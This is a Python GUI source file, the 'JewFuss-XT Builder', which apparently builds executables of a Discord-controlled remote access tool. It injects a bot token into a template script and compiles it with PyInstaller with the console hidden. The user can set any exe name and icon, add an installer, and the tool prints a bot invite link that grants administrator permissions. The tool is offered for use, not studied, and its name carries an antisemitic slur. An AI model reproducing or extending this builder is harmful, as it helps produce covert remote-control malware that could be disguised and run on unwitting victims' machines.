import urllib.request, tkinter as tk, subprocess, threading, requests
import tempfile, shutil, json, time, sys, os, re, argparse, hashlib, signal
from tkinter import ttk, filedialog, messagebox
from PIL import Image, ImageTk
from pathlib import Path
from rich import print
import importlib.util

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, 'data')
OUTPUT_DIR = os.path.join(BASE_DIR, 'builds')
TEMPLATE = os.path.join(BASE_DIR, 'JewFuss-XT.py')
CONFIG_PATH = os.path.join(DATA_DIR, 'config.json')
LOG_FILE = os.path.join(OUTPUT_DIR, 'easy-compiler-build.log')
LATEST = "https://raw.githubusercontent.com/gabrielzv1233/JewFuss-XT/refs/heads/main/JewFuss-XT.py"
RECOMMENDED = (3, 11, 9)

parser = argparse.ArgumentParser(add_help=False)
parser.add_argument("--clean", action="store_true")
parser.add_argument("--debug", action="store_true")
args, _ = parser.parse_known_args()

if args.clean:
    print('[yellow]PyInstaller will compile with "--clean"')
if args.debug:
    print('[yellow]Launched with Debug mode enabled')

def load_version(file_path: str=TEMPLATE) -> str:
        module_name = re.sub(r"\W+", "_", os.path.splitext(os.path.basename(file_path))[0]) + "_dynamic"
        
        if module_name in sys.modules:
            del sys.modules[module_name]

        spec = importlib.util.spec_from_file_location(module_name, file_path)
        module = importlib.util.module_from_spec(spec)
        sys.modules[module_name] = module
        spec.loader.exec_module(module)

        return module.version
    
def rel_path(path):
    script_dir = Path(sys.argv[0]).resolve().parent
    target = Path(path).resolve()
    return os.path.relpath(target, start=script_dir)

class BuilderUI(tk.Tk):
    LocVer = ""

    def __init__(self):
        super().__init__()
        self.title("JewFuss-XT Builder")
        size = (900, 410)
        self.geometry(str(size[0]) + "x" + str(size[1]))
        self.minsize(size[0], size[1])

        self.protocol("WM_DELETE_WINDOW", self.shutdown)

        self.columnconfigure(0, weight=1)
        self.rowconfigure(0, weight=1)

        os.makedirs(DATA_DIR, exist_ok=True)
        os.makedirs(OUTPUT_DIR, exist_ok=True)

        self.token_valid = False
        self.filename_valid = False
        self.icon_path: str | None = None
        self.bot_username: str | None = None
        self.bot_id: str | None = None

        self.token_label_var = tk.StringVar(value="Bot token: (Invalid)")

        self.presets: dict[str, dict] = {}
        self.preset_order: list[str] = []
        self.last_session: dict = {}
        self.active_preset_token: str | None = None

        self.load_config()
        self.create_widgets()
        self.check_python()
        self.check_update()

        if self.active_preset_token:
            self.preset_var.set(self.active_preset_token)
        else:
            self.preset_var.set("")

        self.token_var.trace_add('write', lambda *a: self.on_token_change())
        threading.Thread(target=self.boot_validate, daemon=True).start()

    def shutdown(self):
        try:
            self.save_config()
        finally:
            self.destroy()
        
    def to_foreground(self):
        try:
            self.deiconify()
        
            self.update_idletasks()
            self.lift()
            self.focus_force()
        
            self.attributes("-topmost", True)
            self.after(120, lambda: self.attributes("-topmost", False))
        except Exception as e:
            print("[red]Error bringing app to foreground:", e)

    def load_config(self):
        self.last_session = {
            "token": "",
            "exe_filename": "JewFuss-XT",
            "use_tray_icon": False,
            "compile_installer": False,
            "icon_file": None,
        }
        self.presets = {}
        self.preset_order = []
        self.active_preset_token = None

        if os.path.isfile(CONFIG_PATH):
            try:
                with open(CONFIG_PATH, 'r', encoding='utf-8') as f:
                    raw = json.load(f)
                    print(f"[yellow]Loading config: [blue]{rel_path(CONFIG_PATH)}")

                if "presets" in raw or "last" in raw:
                    self.presets = raw.get("presets", {})
                    self.preset_order = raw.get("preset_order", [])

                    last = raw.get("last", {})
                    self.last_session["token"] = last.get("token", self.last_session["token"])
                    self.last_session["exe_filename"] = last.get("exe_filename", self.last_session["exe_filename"])
                    self.last_session["use_tray_icon"] = bool(last.get("use_tray_icon", self.last_session["use_tray_icon"]))
                    self.last_session["compile_installer"] = last.get("compile_installer", self.last_session["compile_installer"])
                    self.last_session["icon_file"] = last.get("icon_file", self.last_session["icon_file"])
                else:
                    self.last_session["token"] = raw.get("token", self.last_session["token"])
                    self.last_session["exe_filename"] = raw.get("exe_filename", self.last_session["exe_filename"])
                    self.last_session["use_tray_icon"] = bool(raw.get("use_tray_icon", self.last_session["use_tray_icon"]))
                    self.last_session["compile_installer"] = raw.get("compile_installer", self.last_session["compile_installer"])
                    self.last_session["icon_file"] = raw.get("icon_file", self.last_session["icon_file"])

                self.preset_order = [t for t in self.preset_order if t in self.presets]
                for t in self.presets:
                    if t not in self.preset_order:
                        self.preset_order.append(t)

                for key, preset in self.presets.items():
                    if (
                        preset.get("token") == self.last_session["token"]
                        and preset.get("exe_filename") == self.last_session["exe_filename"]
                        and bool(preset.get("use_tray_icon", False)) == bool(self.last_session["use_tray_icon"])
                        and bool(preset.get("compile_installer")) == bool(self.last_session["compile_installer"])
                        and (preset.get("icon_file") or None) == (self.last_session.get("icon_file") or None)
                    ):
                        self.active_preset_token = key
                        break

            except Exception as e:
                print(f"[red]Error loading config: {e}")

    def save_config(self):
        try:
            last = {
                "token": self.token_var.get().strip(),
                "exe_filename": self.exe_var.get().strip() or "JewFuss-XT",
                "use_tray_icon": bool(self.tray_var.get()),
                "compile_installer": self.installer_var.get(),
                "icon_file": self.icon_path if self.icon_path else None,
            }
        except Exception as e:
            print(f"[red]Error collecting last session data for config: {e}")
            last = self.last_session
    
        data = {
            "last": last,
            "presets": self.presets,
            "preset_order": self.preset_order,
        }
    
        try:
            with open(CONFIG_PATH, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2)
            print("[green]Config saved")
        except Exception as e:
            print(f"[red]Error saving config: {e}")
    
        self.last_session = last

    def _bump_preset(self, token: str):
        PresetToBottom = True # Can't decide if i want current preset at top or bottom, so True for bottom, False for top
        if token in self.preset_order:
            self.preset_order.remove(token)
        if PresetToBottom: 
            self.preset_order.append(token)
        else:
            self.preset_order.insert(0, token)
        self.preset_combo["values"] = self.preset_order
        
    def save_preset(self):
        token = self.token_var.get().strip()
        if not token:
            self.to_foreground()
            messagebox.showerror("Error", "Token is empty, cannot save preset", parent=self)
            return

        icon_file = None
        if self.icon_path:
            try:
                ext = os.path.splitext(self.icon_path)[1] or ".ico"
                token_hash = hashlib.sha256(token.encode("utf-8")).hexdigest()
                dest_name = f"{token_hash}_icon{ext}"
                dest_path = os.path.join(DATA_DIR, dest_name)
                if os.path.abspath(self.icon_path) != os.path.abspath(dest_path):
                    shutil.copyfile(self.icon_path, dest_path)
                icon_file = dest_path
                self.icon_path = dest_path
                self.show_icon(dest_path)
            except Exception as e:
                print(f"[red]Failed to save preset icon: {e}")
                self.to_foreground()
                messagebox.showwarning("Icon error", "Failed to save icon for preset, preset will be saved without icon", parent=self)

        preset = {
            "token": token,
            "exe_filename": self.exe_var.get().strip() or "JewFuss-XT",
            "use_tray_icon": bool(self.tray_var.get()),
            "compile_installer": self.installer_var.get(),
            "icon_file": icon_file,
        }

        self.presets[token] = preset
        self._bump_preset(token)

        self.active_preset_token = token
        self.preset_var.set(token)
        self.save_config()
        self.update_build_state()

    def delete_preset(self):
        token = self.preset_var.get()
        if not token or token not in self.presets:
            return

        try:
            del self.presets[token]
        except Exception as e:
            print(f"[red]Error deleting preset '{token}': {e}")

        if token in self.preset_order:
            self.preset_order.remove(token)
        self.preset_combo["values"] = self.preset_order

        if self.active_preset_token == token:
            self.active_preset_token = None

        self.preset_var.set("")

        self.token_var.set("")
        self.exe_var.set("JewFuss-XT")
        self.tray_var.set(False)
        self.installer_var.set(False)
        self.icon_path = None
        self.icon_btn.config(image="", text="Choose Icon")

        self.save_config()
        self.update_build_state()

    def on_preset_selected(self, _event=None):
        token = self.preset_var.get()
        preset = self.presets.get(token)
        if not preset:
            return

        self.active_preset_token = token

        self.token_var.set(preset.get("token", token))
        self.exe_var.set(preset.get("exe_filename", "JewFuss-XT.exe"))
        self.tray_var.set(bool(preset.get("use_tray_icon", False)))
        self.installer_var.set(bool(preset.get("compile_installer", False)))

        icon_file = preset.get("icon_file")
        self.icon_path = None
        if icon_file and os.path.isfile(icon_file):
            self.icon_path = icon_file
            self.show_icon(icon_file)
        else:
            self.icon_btn.config(image="", text="Choose Icon")

        print("[green]Loaded preset")

        self._bump_preset(token)

        self.save_config()
        self.update_build_state()

    def create_widgets(self):
        frm = ttk.Frame(self, padding=10)
        frm.grid(row=0, column=0, sticky="nsew")
        frm.columnconfigure(0, weight=1)

        preset_frame = ttk.Frame(frm)
        preset_frame.grid(row=0, column=0, sticky="ew", pady=(0, 10))
        preset_frame.columnconfigure(1, weight=1)

        ttk.Label(preset_frame, text="Presets:").grid(row=0, column=0, sticky="w", padx=(0, 5))

        self.preset_var = tk.StringVar()
        self.preset_combo = ttk.Combobox(
            preset_frame,
            textvariable=self.preset_var,
            state="readonly",
            width=80,
        )
        self.preset_combo["values"] = self.preset_order
        self.preset_combo.grid(row=0, column=1, sticky="ew")

        self.btn_preset_save = ttk.Button(preset_frame, text="Save", command=self.save_preset)
        self.btn_preset_save.grid(row=0, column=2, padx=(5, 5))

        self.btn_preset_delete = ttk.Button(preset_frame, text="Delete", command=self.delete_preset)
        self.btn_preset_delete.grid(row=0, column=3)

        self.preset_combo.bind("<<ComboboxSelected>>", self.on_preset_selected)

        self.token_label = ttk.Label(frm, textvariable=self.token_label_var)
        self.token_label.grid(row=1, column=0, sticky="w")

        self.token_var = tk.StringVar(value=self.last_session.get("token", ""))
        self.ent_token = ttk.Entry(frm, textvariable=self.token_var)
        self.ent_token.grid(row=2, column=0, sticky="ew", pady=(0, 5))

        self.token_err = tk.StringVar()
        ttk.Label(frm, textvariable=self.token_err, foreground="red").grid(row=3, column=0, sticky="w")

        ttk.Label(frm, text="Exe filename:").grid(row=4, column=0, sticky="w")
        self.exe_var = tk.StringVar(value=self.last_session.get("exe_filename", "JewFuss-XT.exe"))
        self.ent_exe = ttk.Entry(frm, textvariable=self.exe_var)
        self.ent_exe.grid(row=5, column=0, sticky="ew", pady=(0, 5))

        ttk.Label(frm, text="Icon (optional):").grid(row=6, column=0, sticky="w")
        self.icon_btn = ttk.Button(frm, text="Choose Icon", command=self.choose_icon)
        self.icon_btn.grid(row=7, column=0, sticky="w", pady=(0, 5))

        prev_icon = os.path.join(DATA_DIR, "prev_icon.ico")
        icon_to_load = None
        last_icon = self.last_session.get("icon_file")
        if last_icon and os.path.isfile(last_icon):
            icon_to_load = last_icon
        elif os.path.isfile(prev_icon):
            icon_to_load = prev_icon

        if icon_to_load:
            self.icon_path = icon_to_load
            self.show_icon(icon_to_load)
            print(f"[green]Loaded icon from: [blue]{rel_path(icon_to_load)}")

        self.tray_var = tk.BooleanVar(value=bool(self.last_session.get("use_tray_icon", False)))
        self.cb_tray = ttk.Checkbutton(
            frm,
            text="Enable tray icon?",
            variable=self.tray_var,
        )
        self.cb_tray.grid(row=8, column=0, sticky="w", pady=(5, 0))

        self.installer_var = tk.BooleanVar(value=self.last_session.get("compile_installer", False))
        self.cb_installer = ttk.Checkbutton(
            frm,
            text="Compile installer?",
            variable=self.installer_var,
        )
        self.cb_installer.grid(row=9, column=0, sticky="w", pady=(5, 10))

        self.build_btn = ttk.Button(frm, text="Compile", command=self.build)
        self.build_btn.grid(row=10, column=0, sticky="w")

        self.update_build_state()

    def boot_validate(self):
        fn = self.exe_var.get().strip() or "JewFuss-XT.exe"
        self.exe_var.set(fn)
        self.filename_valid = bool(fn)
        tok = self.token_var.get().strip()
        if self._check_token(tok):
            self.after(0, lambda: self.token_err.set("Format OK, checking…"))
            self._validate_token_thread()
        else:
            self.after(0, lambda: self.token_err.set("Invalid format"))
            self.after(0, lambda: self.token_label_var.set("Bot token: (Invalid)"))
            self.after(0, self.update_build_state)

    def on_token_change(self, *_):
        tok = self.token_var.get().strip()
        if self._check_token(tok):
            self.token_err.set("Format OK, checking…")
            self._validate_token_thread()
        else:
            self.token_err.set("Invalid format")
            self.token_label_var.set("Bot token: (Invalid)")
            self.token_valid = False
            self.update_build_state()

        if self.active_preset_token and tok != self.active_preset_token:
            self.active_preset_token = None
            self.preset_var.set("")

    def _check_token(self, t: str) -> bool:
        parts = t.split('.')
        return len(t) == 72 and len(parts) == 3 and len(parts[0]) == 26 and len(parts[1]) == 6 and len(parts[2]) == 38

    def _validate_token_thread(self):
        def work():
            tok = self.token_var.get().strip()
            try:
                r = requests.get(
                    "https://discord.com/api/v10/users/@me",
                    headers={"Authorization": f"Bot {tok}"},
                )
                if r.status_code == 200:
                    info = r.json()
                    self.bot_username = f"{info['username']}#{info['discriminator']}"
                    self.bot_id = info['id']
                    self.token_valid = True
                    self.after(0, lambda: self.token_label_var.set(f"Bot token: ({self.bot_username})"))
                    msg = ""
                else:
                    self.bot_username = None
                    self.bot_id = None
                    self.token_valid = False
                    self.after(0, lambda: self.token_label_var.set("Bot token: (Invalid)"))
                    msg = f"Invalid token ({r.status_code})"
                self.after(0, lambda: self.token_err.set(msg))
            except Exception as e:
                self.bot_username = None
                self.bot_id = None
                self.token_valid = False
                print("[bold #ff0000]Token validation error:", e)
                self.after(0, lambda: self.token_label_var.set("Bot token: (Invalid)"))
                self.after(0, lambda: self.token_err.set("API error"))
            self.after(0, self.update_build_state)

        threading.Thread(target=work, daemon=True).start()

    def update_build_state(self):
        if self.token_valid and self.filename_valid:
            self.build_btn.state(["!disabled"])
        else:
            self.build_btn.state(["disabled"])

    def disable_inputs(self):
        for w in (
            self.ent_token, self.ent_exe, self.icon_btn, self.build_btn,
            self.cb_tray, self.cb_installer,
            self.preset_combo, self.btn_preset_save, self.btn_preset_delete
        ):
            try:
                w.state(["disabled"])
            except Exception:
                try:
                    w.config(state="disabled")
                except Exception as e:
                    print(f"[red]Error disabling widget {w}: {e}")

    def enable_inputs(self):
        for w in (
            self.ent_token, self.ent_exe, self.icon_btn, self.build_btn,
            self.cb_tray, self.cb_installer,
            self.preset_combo, self.btn_preset_save, self.btn_preset_delete
        ):
            try:
                w.state(["!disabled"])
            except Exception:
                try:
                    w.config(state="normal")
                except Exception as e:
                    print(f"[red]Error enabling widget {w}: {e}")
        self.update_build_state()

    def check_python(self):
        cv = sys.version_info[:3]
        if cv != RECOMMENDED:
            self.to_foreground()
            messagebox.showwarning("Python version", f"Using {cv}, recommended {RECOMMENDED}", parent=self)
            print(f"[#f05e1b]Warning: Python {cv}, recommended {RECOMMENDED}")

    def check_update(self):
        try:
            lines = urllib.request.urlopen(LATEST).read().decode().splitlines()
            remote = next(
               (
                   m.group(2)
                   for l in lines
                   if "- 25c75g" in l
                   if (m := re.search(r'version\s*=\s*([\'"])([^\'"]+)\1', l))
               ),
               None,
)
            local = load_version()
            if remote and local and tuple(map(int, local.split("."))) < tuple(map(int, remote.split("."))):
                self.to_foreground()
                messagebox.showinfo("Update available", f"{local} → {remote}", parent=self)
                print(f"[yellow]Update available: [blue]{local} [yellow]→ [blue]{remote}")
        except Exception as e:
            print("[#f05e1b]Update check failed:", e)

    def choose_icon(self):
        p = filedialog.askopenfilename(filetypes=[("Images", "*.ico *.png *.jpg")])
        if p:
            self.icon_path = p
            self.show_icon(p)
            print(f"[yellow]Icon selected: {p}")

    def show_icon(self, path: str):
        try:
            img = Image.open(path)
            img.thumbnail((128, 128))
            self.tkimg = ImageTk.PhotoImage(img)
            self.icon_btn.config(image=self.tkimg, text="")
        except Exception as e:
            print(f"[bold #ff0000]Error showing icon '{path}': {e}")
            self.icon_btn.config(image="", text="Choose Icon")

    def build(self):
        self.save_config()
        if not self.token_valid:
            self.to_foreground()
            messagebox.showerror("Error", "Invalid token", parent=self)
            return

        if self.icon_path:
            try:
                dest = os.path.join(DATA_DIR, "prev_icon.ico")
                if os.path.abspath(self.icon_path) != os.path.abspath(dest):
                    shutil.copyfile(self.icon_path, dest)
                    print(f"[green]Saved icon to {dest} for reuse")
            except Exception as e:
                print(f"[red]Failed to save prev_icon.ico: {e}")

        self.disable_inputs()
        print("[blue]Starting buildprocess")
        threading.Thread(target=self.run_build, daemon=True).start()
    
    def run_build(self):
        try:
            lines = open(TEMPLATE, 'r', encoding='utf-8').read().splitlines()
        except Exception as e:
            print(f"[bold #ff0000]Error reading template '{TEMPLATE}': {e}")
            self.after(0, self.enable_inputs)
            return

        replaced_token = False
        for i, l in enumerate(lines):
            if " - 23r98h" in l:
                lines[i] = f'TOKEN = "{self.token_var.get().strip()}"'
                replaced_token = True
                break

        if not replaced_token:
            print("[bold #ff0000]TOKEN marker ' - 23r98h' not found in template")

        replaced_tray = False
        tray_value = "True" if self.tray_var.get() else "False"
        for i, l in enumerate(lines):
            if " - 28f93g" in l:
                lines[i] = f"USE_TRAY_ICON = {tray_value}"
                replaced_tray = True
                break

        if not replaced_tray:
            print("[bold #ff0000]USE_TRAY_ICON marker ' - 28f93g' not found in template")

        tmpd = tempfile.mkdtemp()
        tf = os.path.join(tmpd, 'temp.py')
        try:
            with open(tf, 'w', encoding='utf-8') as f:
                f.write("\n".join(lines))
        except Exception as e:
            print(f"[bold #ff0000]Error writing temporary file '{tf}': {e}")
            shutil.rmtree(tmpd, ignore_errors=True)
            self.after(0, self.enable_inputs)
            return
        
        if args.debug:
            print("[magenta3]Keeping uncompiled script in builds folder")
            shutil.copyfile(tf, os.path.join(OUTPUT_DIR, "unpackaged-latest.py"))
        
        out_name = self.exe_var.get().strip().removesuffix(".exe")
        out_name = out_name or "JewFuss-XT"
        out_file = out_name + ".exe" if not out_name.endswith('.exe') else out_name

        existing_exe = os.path.join(OUTPUT_DIR, out_file)
        if os.path.isfile(existing_exe):
            bak = time.strftime('%Y-%m-%d-%H-%M-%S-') + out_file
            try:
                os.rename(existing_exe, os.path.join(OUTPUT_DIR, bak))
            except Exception as e:
                print(f"Error backing up existing exe '{existing_exe}': {e}")

        cmd = [
            sys.executable,
            "-m",
            "PyInstaller",
            tf,
            "--onefile",
            "--windowed",
            "--noconsole",
            f"--distpath={OUTPUT_DIR}",
            f"--workpath={DATA_DIR}",
            f"--specpath={DATA_DIR}",
            f"-n={out_name}",
            "--hidden-import=pythoncom",
            "--hidden-import=win32com.client",
            "--collect-submodules=win32com",
            "--collect-submodules=win32comext",
            "--noupx",
        ]

        if args.clean:
            cmd += ["--clean"]

        if self.icon_path:
            cmd += ["--icon", self.icon_path]

        try:
            version = load_version()
            print("[blue]Building JewFuss-XT [yellow]v" + version)
            
        except Exception as e:
            version = 0
            print(f"[red]Error reading version from template: {e}")

        try:
            subprocess.Popen(
                cmd,
                creationflags=subprocess.CREATE_NEW_CONSOLE,
                close_fds=True,
            ).wait()
        except Exception as e:
            print(f"Error running PyInstaller: {e}")
            shutil.rmtree(tmpd, ignore_errors=True)
            self.after(0, self.enable_inputs)
            return

        shutil.rmtree(tmpd, ignore_errors=True)

        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
        invite = None
        if self.bot_id:
            invite = f"https://discord.com/oauth2/authorize?client_id={self.bot_id}&permissions=8&scope=bot"

        built_exe = os.path.join(OUTPUT_DIR, out_file)

        if os.path.isfile(built_exe):
            if self.installer_var.get():
                installer_py = os.path.join(BASE_DIR, "installer.py")
                print("[green]Building installer")
                cmd = [
                    sys.executable,
                    installer_py,
                    "--windowed",
                    f"--file={out_file}",
                    f"--icon={self.icon_path}" if self.icon_path else "",
                    f"--name={out_name}",
                ]
                cmd = [c for c in cmd if c]

                if args.clean:
                    cmd += ["--clean"]

                try:
                    subprocess.Popen(
                        cmd,
                        cwd=OUTPUT_DIR,
                        creationflags=subprocess.CREATE_NEW_CONSOLE,
                        close_fds=True,
                    ).wait()
                except Exception as e:
                    print(f"[bold #ff0000]Error building installer: {e}")

                explorer_target = os.path.join(OUTPUT_DIR, f"{out_name}-installer.exe")
            else:
                explorer_target = built_exe

            try:
                os.system(f'explorer /select,"{explorer_target}"')
            except Exception as e:
                print(f"[red]Error opening Explorer for '{explorer_target}': {e}")

            time.sleep(0.5)
            print(f"\nCompiled JewFuss-XT as {self.bot_username or 'Unknown bot'}")
            if invite:
                print(f"[yellow]Bot invite link: [#99C3FF]{invite}")

            try:
                with open(LOG_FILE, 'a', encoding='utf-8') as log_file:
                    log_file.write(
                        f"\"{timestamp}\": TOKEN = \"{self.token_var.get().strip()}\" "
                        f"({self.bot_username or 'Unknown'}) - {out_name} v{version}\n"
                    )
                del version
            except Exception as e:
                print(f"[red]Error writing log file '{LOG_FILE}': {e}")

            def _show_ok():
                msg = f"Compiled JewFuss-XT as {self.bot_username or 'Unknown bot'}"
                if invite:
                    msg += "\nCheck console for invite link"
                self.to_foreground()
                messagebox.showinfo("Build Complete", msg, parent=self)
            self.after(0, _show_ok)
        else:
            print("[bold #ff0000]Error: JewFuss-XT was unable to compile")

        self.after(0, self.enable_inputs)


if __name__ == "__main__":
    app = BuilderUI()

    def _handle_sigint(_signum, _frame):
        app.after(0, app.shutdown)

    signal.signal(signal.SIGINT, _handle_sigint)

    # Keep Tk event loop waking up so Python can process SIGINT on Windows.
    def _poll_signals():
        if app.winfo_exists():
            app.after(200, _poll_signals)

    app.after(200, _poll_signals)
    app.mainloop()
